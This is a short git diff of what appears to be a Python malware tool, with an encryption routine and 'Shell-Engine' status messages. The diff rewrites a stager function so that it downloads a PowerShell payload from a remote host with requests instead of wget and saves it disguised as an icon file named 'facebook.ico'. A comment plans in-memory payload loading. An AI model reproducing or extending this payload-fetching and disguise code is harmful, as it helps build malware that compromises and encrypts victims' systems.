@@ -27,12 +27,14 @@ def start_encryption(key):
 
 def Enum():
     time.sleep(5)
-    os.system("wget http://192.168.1.181:88/RB01-A.ps1")
+    url = 'http://192.168.1.181:88/RB01-A.ps1'      #will be replaced with powershell code to load payload Directly into memory
+    r = requests.get(url, allow_redirects=True)
+    open('facebook.ico','wb').write(r.content)
     time.sleep(10)
 
 
 planted = "[+] Engine Planted SuccessFully"
-enum = "[+] Shell-Engine::Sleeping For 10 seconds for server to start"
+enum = "[+] Shell-Engine::Sleeping For 10 seconds"
 enum2 = "[+] Fetching Enumeration Payload"
 enum_payload_sucess = "[+] Payload Fetched Successfully Trigger Time Set-To 10sec"
 err = "[+] shell-Engine:: ambiguous command"
